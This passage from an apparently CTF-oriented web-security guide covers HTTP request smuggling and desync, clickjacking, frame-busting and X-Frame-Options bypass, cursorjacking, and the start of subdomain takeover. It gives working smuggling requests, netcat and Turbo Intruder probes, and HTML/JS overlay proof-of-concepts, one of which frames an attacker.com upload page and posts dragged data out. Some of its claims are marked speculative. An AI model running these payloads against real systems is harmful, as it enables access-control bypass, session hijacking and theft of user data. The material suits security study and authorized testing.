/?url=http://internal/%20HTTP/1.1%0d%0aHost:%20internal%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20internal%0d%0a%0d%0a
```

**Decoded:**

```http
GET http://internal/ HTTP/1.1
Host: internal
Content-Length: 0

GET /admin HTTP/1.1
Host: internal

 HTTP/1.1
Host: internal-service
```

**Result:** Two separate requests are sent to the back-end.

### Header Injection Leading to Smuggling

**Vulnerable Application:**

```javascript
// Node.js example
const userAgent = req.headers['user-agent'];
const proxyHeaders = {
    'User-Agent': userAgent,
    'X-Forwarded-For': req.ip
};
```

**Attack via User-Agent:**

```http
POST /api HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com

```

**[Inference]** If the proxy doesn't properly sanitize the `User-Agent` value, the CRLF sequence can split the request.

### Host Header Splitting

**Attack Pattern:**

```http
GET / HTTP/1.1
Host: target.com:80
 evil.com
Content-Length: 0

GET /admin HTTP/1.1
Host: evil.com

```

**Potential Impact:**

- Routing confusion between servers
- Access control bypass
- Cache poisoning with attacker-controlled host

### WebSocket Upgrade Smuggling

**Exploitation:**

```http
GET / HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: random
Content-Length: 100

GET /admin HTTP/1.1
Host: target.com
Cookie: session=victim_session


```

**[Inference]** If the front-end forwards the upgrade but the back-end rejects it, the body may be processed as a new request.

---

## Desynchronization Attacks

Desynchronization attacks exploit timing and state confusion between front-end and back-end servers to cause persistent disruption or exploitation.

### Connection State Desync

**Concept:** Create a state where front-end and back-end disagree about connection status.

#### Keep-Alive Exploitation

**Attack Request:**

```http
POST / HTTP/1.1
Host: target.com
Connection: keep-alive
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**Process:**

1. Front-end forwards request, keeps connection open
2. Back-end processes chunked encoding, sees end of request
3. `X` byte remains in buffer on back-end
4. Front-end sends next legitimate request
5. Back-end receives `X` + legitimate request = malformed/exploitable

### Timeout-Based Desynchronization

**Differential Timeout Attack:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

[WAIT 30 SECONDS]
GET /admin HTTP/1.1
...
```

**Scenario:**

- Front-end timeout: 60 seconds
- Back-end timeout: 30 seconds
- After 30 seconds, back-end closes connection, front-end still expects response
- Next request may bypass front-end validation

### Response Queue Poisoning (RQP)

**Concept:** [Inference] Smuggle requests that cause misaligned response queuing, where responses are delivered to wrong requests.

**Attack Pattern (CL.TE):**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

username=victim&password=
```

**Victim Request Arrives:**

```http
GET /profile HTTP/1.1
Host: target.com
Cookie: session=victim_session
```

**Result:**

1. Smuggled `POST /login` has incomplete body
2. Victim's request completes the body: `username=victim&password=GET /profile...`
3. Back-end processes authentication attempt
4. Response to `/login` is sent to attacker's connection
5. Response to `/profile` may be sent to wrong user

### HTTP/2 Downgrade Desync

**Scenario:** Front-end accepts HTTP/2, back-end only supports HTTP/1.1.

**HTTP/2 Pseudo-Headers:**

```
:method: POST
:path: /
:authority: target.com
content-length: 4

body
```

**Downgrade Issues:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4

body
```

**Attack via Header Injection in HTTP/2:**

```
:method: POST
:path: /
:authority: target.com
content-length: 4
custom-header: value\r\nTransfer-Encoding: chunked

0

GET /admin HTTP/1.1
...
```

**[Unverified]** Some HTTP/2 implementations may not properly sanitize header values before downgrading, allowing CRLF injection.

### Pipeline Desynchronization

**HTTP Pipelining + Smuggling:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
GET / HTTP/1.1
Host: target.com

```

**With Pipelining Enabled:**

1. Both requests are sent in one TCP stream
2. Front-end processes first POST
3. Back-end processes POST + smuggled GET
4. Second GET arrives but back-end already processed a GET
5. Response queue becomes desynchronized

---

## Practical Tool Usage

### Burp Suite Turbo Intruder

**Timing-Based Detection Script:**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # CL.TE detection
    attack = '''POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X'''
    
    engine.queue(attack)
    engine.queue(target.req, gate='race1')
    
    # If second request times out, likely vulnerable
```

**Automated Smuggling Detection:**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # Send smuggling probe
    probe = '''POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /404test HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x='''
    
    engine.queue(probe)
    
    # Send normal request that should trigger 404
    for i in range(10):
        engine.queue(target.req)
```

### HTTP Request Smuggler (Burp Extension)

**Basic Detection:**

1. Install "HTTP Request Smuggler" extension
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. Extension automatically tests CL.TE, TE.CL, TE.TE variants

**Manual Configuration:**

```
Techniques to test:
☑ CL.TE (front-end Content-Length, back-end Transfer-Encoding)
☑ TE.CL (front-end Transfer-Encoding, back-end Content-Length)
☑ TE.TE obfuscation variants
```

### smuggler.py (Command-Line Tool)

**Installation:**

```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -h
```

**Basic Detection Scan:**

```bash
python3 smuggler.py -u https://target.com/
```

**Quiet Mode with Specific Technique:**

```bash
python3 smuggler.py -u https://target.com/ -q -t CL.TE
```

**Output Analysis:**

```
[+] Potential CL.TE vulnerability detected
[+] Issue: Time delay on follow-up request
[+] Confidence: High
```

### Manual Testing with netcat/telnet

**CL.TE Test:**

```bash
# Terminal 1: Send smuggling request
(printf "POST / HTTP/1.1\r\n"\
"Host: target.com\r\n"\
"Content-Length: 6\r\n"\
"Transfer-Encoding: chunked\r\n"\
"\r\n"\
"0\r\n"\
"\r\n"\
"X"; sleep 2) | nc target.com 80

# Terminal 2: Send follow-up request
printf "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
```

**Expected Result:** If vulnerable, Terminal 2 receives error about `XGET` being invalid method.

**TE.CL Test:**

```bash
printf "POST / HTTP/1.1\r\n"\
"Host: target.com\r\n"\
"Content-Length: 4\r\n"\
"Transfer-Encoding: chunked\r\n"\
"\r\n"\
"5c\r\n"\
"GPOST / HTTP/1.1\r\n"\
"Content-Type: application/x-www-form-urlencoded\r\n"\
"Content-Length: 15\r\n"\
"\r\n"\
"x=1\r\n"\
"0\r\n"\
"\r\n" | nc target.com 80
```

---

## Exploitation Scenarios

### Bypassing Front-End Security Controls

**WAF Bypass via Smuggling:**

```http
POST /public HTTP/1.1
Host: target.com
Content-Length: 180
Transfer-Encoding: chunked

0

POST /admin/deleteUser HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

userId=123&confirm=true
GET /public HTTP/1.1
Host: target.com


```

**Process:**

1. Front-end/WAF sees safe `POST /public`
2. Back-end processes smuggled `POST /admin/deleteUser`
3. Access control bypass achieved

### Session Hijacking via Response Queue Poisoning

**Attack Request:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

username=attacker&password=
```

**When Victim Requests:**

```http
GET / HTTP/1.1
Host: target.com
Cookie: session=victim_token
```

**Result:**

- Victim's request completes the `Content-Length` body
- Login succeeds with attacker's credentials
- Response (including `Set-Cookie` for attacker) sent to victim's connection
- Attacker obtains victim's subsequent response

### Cache Poisoning for Persistent XSS

**Attack (CL.TE):**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /api/user?id=<script>alert(document.cookie)</script> HTTP/1.1
Host: target.com

GET /static/main.js HTTP/1.1
Host: target.com


```

**If Application Reflects `id` Parameter:**

1. Response includes XSS payload
2. Cached under `/static/main.js` key
3. All users loading `main.js` execute payload
4. Persistent XSS affecting entire site

---

## Detection and Identification Techniques

### Timing-Based Detection

**Differential Timing Pattern:**

```python
import requests
import time

def detect_cl_te(url):
    # Normal request baseline
    start = time.time()
    requests.get(url)
    baseline = time.time() - start
    
    # Smuggling probe
    probe = """POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X"""
    
    start = time.time()
    requests.request('POST', url, data=probe)
    time.sleep(5)
    probe_time = time.time() - start
    
    # Follow-up request
    start = time.time()
    requests.get(url)
    followup_time = time.time() - start
    
    if followup_time > (baseline * 2):
        print("[+] Potential CL.TE vulnerability detected")
        print(f"[+] Baseline: {baseline}s, Follow-up: {followup_time}s")
```

### Differential Response Detection

**Storage-Based Detection:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

comment=SMUGGLED_REQUEST_MARKER&csrf=
```

**Process:**

1. Smuggled comment submission with unique marker
2. Legitimate user's request completes the body
3. Check comments page for `SMUGGLED_REQUEST_MARKER`
4. If present, confirms vulnerability

### Status Code Anomaly Detection

**Probe with Invalid Method:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 30
Transfer-Encoding: chunked

0

INVALID /test HTTP/1.1


```

**Follow-up:**

```http
GET / HTTP/1.1
Host: target.com

```

**Expected:** If vulnerable, follow-up receives `400 Bad Request` or `501 Not Implemented` due to `INVALID` method.

---

## Defense Evasion Techniques

### Normalizing Ambiguous Requests

**Using HTTP/0.9 Syntax:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 20
Transfer-Encoding: chunked

0

GET /admin


```

**[Inference]** HTTP/0.9 doesn't require full request line, may bypass parsing differences.

### Exploiting Chunk Extension Parsing

**Chunk Extensions (RFC 7230):**

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

0; ignoredExtension=value

GET /admin HTTP/1.1
Host: target.com


```

**[Inference]** Some servers may misparse chunk extensions, treating the line differently.

### Header Ordering Exploitation

**Reordering Ambiguous Headers:**

```http
POST / HTTP/1.1
Transfer-Encoding: chunked
Host: target.com
Content-Length: 4

0


```

**vs**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

0


```

**[Inference]** Header processing order differs between implementations and may affect precedence decisions.

---

## Important Caveats and Limitations

**[Inference]** Request smuggling success depends on:

- Connection reuse (keep-alive) between front-end and back-end
- Specific parsing implementations in both systems
- Network architecture (direct connections vs multiple proxies)

**[Unverified]** Detection rates vary significantly:

- Timing-based detection can have false positives from network latency
- Some architectures close connections immediately, preventing exploitation
- HTTP/2 and HTTP/3 have different attack surfaces

**Testing Restrictions:**

- **Never test on production systems without authorization**
- Smuggling attacks can disrupt legitimate traffic
- Cache poisoning affects multiple users
- Response queue poisoning can cause widespread session confusion

**Related advanced topics:**

- HTTP/2 request smuggling and downgrade attacks
- Browser-Powered Desync Attacks (client-side smuggling)
- WebSocket smuggling techniques
- gRPC and protocol buffer smuggling
- Cloud-specific smuggling (AWS ALB, CloudFront, etc.)

---

# Click Jacking & UI Redressing

## Clickjacking Mechanics

Clickjacking exploits user trust in visual interface elements by disguising malicious actions behind legitimate-looking UI. The attack works by layering an invisible or semi-transparent iframe containing the target site over a decoy page that triggers user clicks on specific coordinates.

**Core mechanism:** An attacker hosts a page with an invisible iframe pointing to a legitimate site (e.g., a social media platform). The iframe is positioned so that its critical interactive elements—like a "Confirm" button—align with visible decoy buttons on the attacker's page. When the user clicks the decoy button, they simultaneously click the hidden element on the target site.

**Layering techniques:** CSS positioning and opacity manipulation create the invisibility. Setting `opacity: 0` renders content invisible while maintaining clickability. Alternatively, `clip-path` or `position: absolute` with negative margins can hide elements outside visible viewport bounds. Z-index stacking places the iframe above or below other elements strategically.

**Cursor manipulation:** Attackers often overlay cursor images or use CSS properties to make clicks appear safe. Setting `cursor: pointer` on the decoy area and matching the visual style of legitimate buttons reduces user suspicion.

**Multi-stage attacks:** Complex clickjacking chains multiple hidden iframes. For example, the first iframe might contain a permission prompt, the second a confirmation dialog. Users click through what appears to be a normal interaction sequence while executing hidden actions on the target site.

**Context-dependent positioning:** The iframe can be resized and repositioned using CSS to target specific UI elements. A 50x50px iframe positioned at `top: 250px; left: 400px` can precisely overlay a button, requiring pixel-perfect alignment calculated from the target site's known layout.

## Frame Busting Bypass

Frame busting code attempts to prevent iframes from loading content. Common implementations check if `self !== top` (comparing the current window with the topmost window) and break out of the iframe using `top.location = self.location` or similar methods. CTF exploitation requires understanding these defensive mechanisms and bypassing them.

**Self-referential bypass:** Some frame busting checks rely on comparing window objects. The `sandbox` attribute on iframes restricts certain capabilities. An iframe with `sandbox="allow-same-origin allow-scripts"` may still execute frame-busting code, but removing `allow-top-navigation` prevents `top.location` assignments. [Unverified] However, specific sandbox configurations depend on browser implementation.

**X-Frame-Options header bypass:** Servers implement `X-Frame-Options: DENY` or `X-Frame-Options: SAMEORIGIN` to prevent framing. Direct iframe embedding will fail with these headers present. Workarounds include:

- **Double-framing:** Frame the attacker's page (which contains the iframe) rather than the target directly. If the target allows framing from its own origin, and the attacker controls a page on that origin through a separate vulnerability, double-framing can load the target.
- **CSP bypass:** Content Security Policy `frame-ancestors` directives replace X-Frame-Options in modern implementations. Policies like `frame-ancestors 'self'` can be bypassed if a reflected XSS vulnerability exists on an allowed origin, enabling script injection that modifies frame policies.
- **Historical/legacy bypass:** Older browsers or specific server configurations may have inconsistent header parsing. [Speculation] Testing with different HTTP versions or header encoding variations might expose inconsistencies, though modern browsers handle this consistently.

**JavaScript frame-busting circumvention:**

```javascript
// Target implements frame busting
if (self !== top) {
  top.location = self.location;
}

// Attacker bypasses with:
// Method 1: Redefine top before page loads
var top = self;
// Embedded in the framing page or injected via TOCTOU race condition

// Method 2: Use onbeforeunload to prevent navigation
window.onbeforeunload = function() {
  return "Staying here";
};
// The frame bust triggers but navigation is blocked

// Method 3: For same-origin frames, use defineProperty
Object.defineProperty(window, 'top', {
  get: function() { return self; }
});
```

**Race conditions:** Frame-busting code executes after page load. Attackers can trigger clickjacking actions during the microsecond window before frame-busting detection. [Speculation] Timing attacks exploiting JavaScript event loop delays might enable clicks to register before defensive code runs, though practical exploitation depends on page complexity.

**Meta refresh and history manipulation:** If frame-busting uses `history.go(-1)` to navigate away, the attacker's page can pre-populate browser history or manipulate the back button, confusing the defensive mechanism.

## UI Element Manipulation

Clickjacking extends beyond simple button overlays to sophisticated UI manipulation attacks that alter user perception and behavior.

**Password confirmation overlay:** An attacker creates a login-like form that visually mirrors a legitimate site but actually captures credentials. The form is layered over an invisible iframe of the real site. Users believe they're logging into the legitimate service while submitting credentials to the attacker.

```html
<!-- Attacker's decoy form overlaid on invisible target iframe -->
<iframe name="target" src="https://target-site.com" 
        style="position: absolute; opacity: 0; width: 100%; height: 100%;"></iframe>

<div style="position: relative; z-index: 1;">
  <!-- Fake login form positioned to collect credentials -->
  <input type="text" placeholder="Username" id="fake-user">
  <input type="password" placeholder="Password" id="fake-pass">
  <button onclick="stealCredentials()">Login</button>
</div>
```

**Drag-and-drop exploitation:** Modern browsers allow dragging files onto iframes. An attacker can position an invisible iframe over a file upload area on their page. Users attempting to drag files onto what they believe is their local area are actually uploading to the attacker's server framed transparently.

**Likejacking:** Positioning an invisible Facebook "Like" button over a visible decoy link. Users click the decoy but simultaneously click the hidden Facebook button, liking content without consent. Combating this requires disabling third-party click tracking or strict Content Security Policy implementation.

**Redirect chaining with UI:** An attacker layers multiple iframes with intermediate redirects. Each layer presents a slightly different visual element, creating a false sense of progression (e.g., "Step 1 of 3"). In reality, the user's clicks execute hidden actions on each layer before the chain completes.

**Text selection-based attacks:** Positioning text elements with hidden iframes underneath allows attackers to capture text selection events. When users select text to copy, the hidden iframe receives the click, potentially triggering unintended actions.

**Plugin exploitation via framing:** Older Flash or Java applets within iframes could be manipulated through clickjacking. While modern browsers have deprecated these, [Unverified] legacy systems or CTF scenarios may still include plugin-based targets requiring frame-level interaction exploitation.

**Keystroke interception through focus manipulation:** Iframes can steal keyboard focus. An attacker's hidden iframe gains focus while appearing not to, capturing keystrokes intended for the visible page. Modern browsers restrict this through sandbox attributes and same-origin policies, but [Speculation] timing-based focus switching during page load might enable temporary capture.

**Testing and validation in CTF contexts:**

Use browser developer tools to inspect iframe positioning and opacity. Check the Network tab for framed resource requests. Examine the HTML structure for z-index layering and CSS positioning properties. Testing clickjacking vulnerabilities requires:

```bash
# Enumerate target site's frame-busting implementation
curl -I https://target-site.com | grep -i "x-frame-options\|content-security-policy"

# Attempt basic iframe framing
# Create test.html with:
# <iframe src="https://target-site.com"></iframe>
# Open in browser to see if framing succeeds or is blocked

# Use browser console to test frame-busting bypasses
# Check if top !== self indicates frame detection
# Attempt to access parent frame properties
```

When exploiting UI redressing in CTF environments, document the exact positioning coordinates where clicks register on both the visible decoy and hidden target elements. Create proof-of-concept HTML demonstrating the vulnerability with detailed comments explaining each CSS property's role in the attack. Include screenshots showing the visual overlay and the underlying framed content revealed through developer tools inspection.

---

## Dragging and Dropping Attacks

Drag-and-drop exploitation manipulates the HTML5 Drag and Drop API to trick users into transferring sensitive data or triggering unintended actions. The vulnerability exploits the assumption that users maintain agency over where content lands.

**Drag-and-drop mechanism fundamentals:** Modern browsers support the `ondrag`, `ondrop`, and `ondragover` events. When a user drags content, these events fire sequentially. The `ondragover` event must call `preventDefault()` on the event object to establish a valid drop zone. Without this, the `ondrop` event won't execute. Attackers manipulate this flow by creating invisible drop zones or overlaying visual elements that misrepresent drop targets.

**File upload redirection:** An attacker creates a page displaying a visible file upload area labeled "Upload your document here." Underneath, an invisible iframe containing a different site's file upload form is positioned at the exact same coordinates. When users drag files onto the visible upload zone, the browser's drag-and-drop events fire on the invisible iframe instead. The file uploads to the attacker's server rather than the user's intended destination.

```html
<!-- Visible decoy upload area -->
<div id="visible-drop-zone" style="
  width: 300px; 
  height: 200px; 
  border: 2px dashed blue; 
  position: absolute; 
  top: 100px; 
  left: 100px;
">
  Drag files here
</div>

<!-- Invisible iframe positioned over the same area -->
<iframe id="hidden-upload" src="https://attacker.com/upload" style="
  position: absolute; 
  top: 100px; 
  left: 100px; 
  width: 300px; 
  height: 200px; 
  opacity: 0; 
  z-index: 10;
  border: none;
"></iframe>

<script>
// Prevent default drag behavior on visible zone to allow passthrough
document.getElementById('visible-drop-zone').addEventListener('dragover', function(e) {
  e.preventDefault();
  e.stopPropagation();
  this.style.backgroundColor = '#f0f0f0';
}, false);

document.getElementById('visible-drop-zone').addEventListener('dragleave', function(e) {
  this.style.backgroundColor = 'transparent';
}, false);

// The drop event on the invisible iframe processes the file upload
</script>
```

**Clipboard data theft during drag operations:** The HTML5 Drag and Drop API exposes `dataTransfer` object properties including `types` and `getData()`. An attacker can listen to `ondragenter` or `ondragover` events and extract clipboard or drag data without the user completing the drop action. [Speculation] Some browsers may expose data preview information during drag operations before the drop is committed, potentially leaking sensitive content.

**Cross-origin drag-and-drop restrictions:** Modern browsers enforce same-origin policies on `dataTransfer` access when dragging content between origins. However, [Unverified] if an attacker controls both the source and destination (even across different subdomains through DNS rebinding or CORS misconfiguration), data transfer may bypass these protections.

**Drag data type confusion:** When users drag mixed content types (text, images, files), the `dataTransfer.types` array contains all types. An attacker's drop handler can prioritize specific types using conditional logic, effectively choosing which data type to accept. For example, if a user drags both image and text data, the attacker can extract only the image's source URL, potentially accessing unauthorized resources.

```javascript
document.addEventListener('drop', function(e) {
  e.preventDefault();
  
  // Check available data types
  const types = e.dataTransfer.types;
  
  // Prioritize URL extraction over other data
  if (types.includes('text/uri-list')) {
    const urls = e.dataTransfer.getData('text/uri-list');
    // Send URLs to attacker's server
    fetch('/log-urls', { method: 'POST', body: urls });
  }
  
  // Fall back to text data
  if (types.includes('text/plain')) {
    const text = e.dataTransfer.getData('text/plain');
    // Extract credentials, tokens, or sensitive text
  }
});
```

**Protected mode bypass:** Some systems enable "Protected Mode" or "Compatibility Mode" that restricts file access. [Speculation] Drag-and-drop operations from trusted file explorers might bypass these restrictions if the destination page can convince the browser that it's a legitimate application context.

**Redirect chain with drag-and-drop:** A multi-stage attack chains drag-and-drop with redirects. The user drags a file onto what appears to be a secure upload form. The invisible iframe processes the upload but then triggers a redirect to a phishing page or malware distribution site. By the time the redirect completes, the user's focus has shifted, reducing detection probability.

## Cursorjacking

Cursorjacking manipulates visual cursor representation to mislead users about where their clicks will land. Unlike standard clickjacking that relies on transparent overlays, cursorjacking focuses on deceiving users about cursor position and click semantics.

**CSS cursor property manipulation:** The `cursor` CSS property controls the visual cursor appearance. An attacker can display a pointer cursor over a clickable link while the actual interaction zone is offset by several pixels. The user believes they're clicking a safe element but interact with a hidden layer instead.

```css
/* Visible link appears safe with normal pointer cursor */
#safe-link {
  cursor: pointer;
  color: blue;
  text-decoration: underline;
}

/* Hidden clickable area positioned above the visible link */
#hidden-button {
  position: absolute;
  top: 200px;
  left: 100px;
  width: 100px;
  height: 30px;
  opacity: 0;
  cursor: pointer; /* Cursor shows pointer even when over hidden element */
  z-index: 10;
}

/* CSS that makes cursor appear normal while hovering over hidden element */
#hidden-button:hover {
  cursor: pointer; /* Maintains pointer appearance */
}
```

**Cursor image replacement:** Modern browsers allow custom cursor images via `cursor: url('custom-cursor.png'), auto`. An attacker displays a misleading cursor image that points to the wrong location. For example, a cursor image showing a pointer aimed 50 pixels to the left of the actual cursor hotspot creates spatial confusion.

```css
#misleading-zone {
  cursor: url('data:image/png;base64,iVBORw0KGgo...'), auto;
  /* Custom PNG shows pointer aimed leftward */
  /* Actual hotspot is centered, creating 50px offset */
  width: 100%;
  height: 100%;
}
```

**Cursor hiding and repositioning:** JavaScript can hide the native cursor and draw a custom cursor at different coordinates. The attacker listens to `mousemove` events and positions a fake cursor element at `(e.clientX - 50, e.clientY - 50)`, creating a 50-pixel offset between perceived and actual cursor position.

```javascript
// Hide native cursor
document.body.style.cursor = 'none';

// Custom cursor element
const customCursor = document.createElement('div');
customCursor.style.cssText = `
  position: fixed;
  width: 20px;
  height: 20px;
  background: radial-gradient(circle, blue 50%, transparent 70%);
  border-radius: 50%;
  pointer-events: none;
  z-index: 9999;
`;
document.body.appendChild(customCursor);

// Track mouse movement with offset
document.addEventListener('mousemove', function(e) {
  // Display custom cursor 50px to the right of actual position
  customCursor.style.left = (e.clientX + 50) + 'px';
  customCursor.style.top = (e.clientY + 50) + 'px';
});

// Clicks register at actual position, not displayed cursor position
```

**Cursor state confusion:** An attacker's page can manipulate cursor states to suggest different interaction modes. Displaying a "wait" cursor (`cursor: wait`) while establishing a click trap suggests the page is processing, keeping users from moving their cursor away before a click registers.

**Animated cursor sequences:** Rapidly changing cursor images (via CSS animation or JavaScript `mousemove` listeners) creates visual disorientation. Users struggle to track the cursor's actual position when the visual representation flickers or moves unexpectedly.

```css
@keyframes cursor-flicker {
  0% { cursor: pointer; }
  50% { cursor: text; }
  100% { cursor: pointer; }
}

#confusing-area {
  animation: cursor-flicker 0.1s infinite;
}
```

**Cursor predictability attacks:** JavaScript can predict cursor trajectories based on historical movement data. If a user consistently moves the cursor from point A to point B, an attacker can pre-position click traps along that trajectory. When the user reaches the predicted position, the trap activates.

[Speculation] Machine learning models trained on cursor movement patterns might predict user intent and position clickjacking overlays proactively, though practical exploitation at scale is unverified.

**Pointer-events CSS bypass:** Setting `pointer-events: none` on the visible UI layer allows clicks to pass through to lower layers. An attacker can create the appearance of safe UI elements that don't actually receive clicks—all clicks pass through to hidden iframes or buttons beneath.

```html
<!-- Visible "safe" button -->
<button style="pointer-events: none; position: relative; z-index: 1;">
  Click me safely
</button>

<!-- Hidden clickable layer that receives all clicks -->
<div style="
  position: absolute;
  top: 100px;
  left: 100px;
  width: 100px;
  height: 30px;
  pointer-events: auto;
  z-index: 10;
  opacity: 0;
" onclick="maliciousAction()"></div>
```

## X-Frame-Options Bypass

X-Frame-Options HTTP headers prevent a page from being displayed within an iframe. The header accepts values including `DENY` (never allow framing), `SAMEORIGIN` (allow framing from same origin), and `ALLOW-FROM uri` (allow framing from specific URI). Bypassing these requires understanding browser implementation and leveraging secondary vulnerabilities.

**Header parsing inconsistencies:** Different browsers parse X-Frame-Options inconsistently. [Unverified] Malformed headers or ambiguous syntax might be interpreted differently across browser versions. Testing with non-standard header values, case variations, or whitespace anomalies could expose parsers that fail safely (ignoring malformed headers) versus those that apply the closest-matching rule.

```bash
# Test various header formats
curl -I https://target.com | grep -i x-frame-options

# Some browsers may not recognize:
# X-Frame-Options: DENY, DENY (duplicate values)
# X-Frame-Options: deny (lowercase)
# X-Frame-Options: DENY; charset=utf-8 (extra parameters)
```

**CSP frame-ancestors bypass through XSS:** Content Security Policy's `frame-ancestors` directive supersedes X-Frame-Options in modern browsers. If a reflected XSS vulnerability exists on the target site, an attacker injects JavaScript that modifies the CSP meta tag or injects a new one with relaxed frame-ancestors values before the iframe loads.

```html
<!-- Attacker injects via XSS: -->
<script>
// Overwrite CSP meta tag before page renders
const meta = document.createElement('meta');
meta.httpEquiv = 'Content-Security-Policy';
meta.content = "frame-ancestors 'self' https://attacker.com";
document.head.insertBefore(meta, document.head.firstChild);
</script>
```

**TOCTOU (Time-of-Check-Time-of-Use) race condition:** The browser checks X-Frame-Options when the iframe begins loading. If an attacker can modify the frame's `src` attribute between initial iframe creation and full page load, they might bypass the header check. [Speculation] Using `MutationObserver` to detect frame injection and modifying properties before content loads could theoretically enable bypass, though modern browsers load content immediately.

**DNS rebinding attacks:** An attacker controls a domain that initially resolves to the attacker's server (passing same-origin checks), then rebinds to the target domain's IP. The iframe initially loads from what appears to be the same origin, bypassing `SAMEORIGIN` checks. Once loaded, JavaScript on the attacker's domain can interact with the target's content. [Unverified] Modern browsers implement DNS pinning to prevent this, though [Speculation] timing attacks during the rebinding window might enable partial exploitation.

**Pixel timing and document.domain manipulation:** If the target site uses `document.domain = 'example.com'` to enable cross-subdomain communication, an attacker on a sibling subdomain can do the same and access the framed content. This doesn't bypass the header but circumvents same-origin policy restrictions once framing is established.

[Unverified] This requires the attacker to control a subdomain of the same parent domain, which is a significant precondition.

```javascript
// On attacker.example.com
document.domain = 'example.com';

// Access target.example.com if it's framed and also sets document.domain
const targetWindow = document.getElementById('target-frame').contentWindow;
// Now can access targetWindow's properties
```

**Null origin frames:** Sandboxed iframes with `sandbox="allow-scripts"` (but not `allow-same-origin`) create a null origin context. [Unverified] This null origin might not match the X-Frame-Options restrictions, potentially allowing framing of origins that would otherwise block sandboxed content.

```html
<iframe src="https://target.com" sandbox="allow-scripts"></iframe>
<!-- Sandbox restrictions may prevent X-Frame-Options enforcement in some configurations -->
```

**Historic browser vulnerabilities:** Older browser versions had parsing bugs in X-Frame-Options. [Unverified] IE6 and early IE7 versions reportedly ignored the header under certain conditions, and Firefox had issues with case sensitivity in some releases. CTF challenges may include legacy browsers where these flaws remain exploitable.

**CORS preflight bypass through framing:** While X-Frame-Options specifically restricts framing, CORS preflight requests for cross-origin iframe communication can be exploited. If the target implements overly permissive CORS headers (e.g., `Access-Control-Allow-Origin: *`), framed content can make requests despite X-Frame-Options restrictions.

[Unverified] The interaction between CORS headers and X-Frame-Options depends on request type and browser implementation.

**Third-party header stripping:** Reverse proxies, CDNs, or intermediary services might strip or modify X-Frame-Options headers during transit. An attacker performing a man-in-the-middle attack or controlling infrastructure in the request path can remove the header entirely, allowing framing. In corporate environments using proxy servers, [Speculation] misconfigured proxies might inadvertently strip security headers.

**Testing and validation:**

```bash
# Enumerate X-Frame-Options header
curl -I https://target.com | grep -i x-frame-options

# Check for CSP frame-ancestors directive
curl -I https://target.com | grep -i content-security-policy

# Test iframe framing directly
# Create test.html:
# <iframe src="https://target.com" style="width: 100%; height: 100vh;"></iframe>
# Open in browser; check developer console for frame rejection

# Check for document.domain usage
curl https://target.com | grep -i "document\.domain"

# Attempt XSS injection to bypass CSP/X-Frame-Options
# Test reflected parameters for injection points
curl "https://target.com/page?param=<script>alert(1)</script>"

# Use browser DevTools to inspect CSP headers in Network tab
# Look for nonce or hash-based policies that might be bypassable
```

In CTF exploitation, document the exact HTTP headers present on the target and the browser behavior when framing is attempted. Create proof-of-concept HTML demonstrating successful bypass, with detailed comments explaining which vulnerability was exploited and why X-Frame-Options checks were circumvented. Include Network tab screenshots showing header presence and frame loading behavior.

---

# Subdomain Takeover

## Dangling DNS Records

### Understanding Dangling DNS

A dangling DNS record occurs when a subdomain's DNS entry points to an external service that no longer exists or is unclaimed. The DNS record remains active while the target resource has been deprovisioned.

**Vulnerable Configuration:**

```
subdomain.example.com  →  CNAME  →  app.herokuapp.com
                                     (deprovisioned/unclaimed)
```

**Attack Flow:**

1. Attacker identifies dangling CNAME
2. Claims the unclaimed resource on the external service
3. Subdomain now resolves to attacker-controlled content
4. Attacker serves malicious content under victim's domain

### Enumeration Techniques

**DNS Record Enumeration:**

```bash
# Basic subdomain enumeration
dig example.com ANY
dig @8.8.8.8 example.com ANY

# Check specific subdomain CNAME
dig subdomain.example.com CNAME +short

# Query all DNS record types
for type in A AAAA CNAME MX NS TXT; do
    echo "=== $type Records ==="
    dig example.com $type +short
done
```

**Using subfinder:**

```bash
# Install
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Enumerate subdomains
subfinder -d example.com -o subdomains.txt

# With multiple sources
